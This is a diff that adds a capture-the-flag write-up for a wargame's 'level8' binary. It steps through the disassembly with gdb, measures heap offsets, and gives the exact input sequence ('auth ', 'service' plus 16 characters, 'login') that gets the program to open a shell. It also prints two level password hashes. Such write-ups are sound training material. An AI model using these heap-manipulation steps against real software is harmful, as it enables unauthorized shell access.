@@ -1,0 +1,126 @@
+login : pw
+	level8 : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+disas main
+	=> stack allocated = 0xa0 = 160
+	=> printf called
+		=> esp+0x8 is ds:0x8049ab0
+			=> x/s 0x8049ab0
+				=> 0x8049ab0 <service>:	""
+					=> global var
+		=> esp+0x4 is ds:0x8049aac
+			=> x/s 0x8049aac
+				=> 0x8049aac <auth>:	""
+					=> global var
+		=> esp is 0x8048810
+			=> x/s 0x8048810
+				=> "%p, %p \n"
+	fgets called
+		=> esp+0x8 is ds:0x8049a80
+			=> stdin
+		=> esp+0x4 = 0x80 = 128
+		=> esp is esp+0x20 => buf size = 32
+			=> buf stored in esp+0x20
+	=> test   eax,eax
+		=> And bitwise without modifying registers
+		=> sets zero flag to true if AND operation is 0
+			=> eax & eax == 0 if eax == 0
+		=> return
+	=> repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+		=> Source Index / Destination Index
+		=> String comparison
+			=> esi holds buf from fgets
+			=> edi holds "auth "
+		=> This compares each string byte until ZF is set so until bytes differ
+			=> Maximum iteration is set to 5
+	=> If buf is the same as "auth "
+		=> Malloc 4 bytes and stores it into global var auth
+		=> repnz scas al,BYTE PTR es:[edi]
+			=> String length checker
+				=> edi is our buf + 5
+				=> if length <= 30
+					=> copy input + 5 into global var auth
+	=> repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+		=> String comparison
+			=> esi holds buf from fgets
+			=> edi holds "reset"
+		=> This compares each string byte until ZF is set so until bytes differ
+			=> Maximum iteration is set to 5
+	=> If buf is the same as "reset"
+		=> free called with auth
+	=> Then same kind of comparison but with "service" and a counter of 6
+		=> Calls strdup on input + 7
+			=> Stores it in global var strdup
+	=> Then same kind of comparison but with "login" and a counter of 5
+		=> Jump to main+16 (printf called) if not equal
+	=> if auth + 32 is not 0
+		=> Calls system with /bin/sh
+	=> else
+		=> Calls fwrite
+
+So we need auth+32 to contain something and then call login
+
+First step is to type "auth " to initialise auth pointer
+	=> This is a dynamic allocation in the heap
+		=> At most we can input 32 bytes so we cant get auth + 32 to be something directly
+
+Writing service calls strdup
+	=> strdup calls malloc so will allocate on the heap too
+	=> Lets see in gdb if we can put something in auth+32
+		=> letters following service calls are duplicated
+
+b *main+140
+	=> After malloc call if input is "auth "
+b *main+332
+	=> After strdup call if input is "service"
+run
+	=> "auth "
+		=> hit breakpoint
+		=> return value of malloc in eax
+			=> i r eax
+				=> 0x804a008 (auth start address)
+				=> p/d 0x804a008+32
+					=> 0x804a028 (target address for login)
+	=> service
+		=> hit breakpoint
+		=> return value of strdup in eax
+			=> i r eax
+				=> 0x804a018 (strdup start address)
+p/d 0x804a018-0x804a008
+	=> 16
+p/d 0x804a028-0x804a018
+	=> 16
+
+We need to put 16 letters following service calls to put something in auth+32
+	=> Then we need to call login
+
+delete
+	=> Delete all breakpoints
+
+r
+	=> "auth "
+	=> service0123456789012345
+	=> login
+		=> We get a shell
+
+Lets do it outside of gdb
+./level8
+	=> "auth "
+	=> service0123456789012345
+	=> login
+		=> we have a shell
+
+cat /home/user/level9/.pass
+	=> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a	
+
+
+
+
+
+
+
+
+
+
+
+
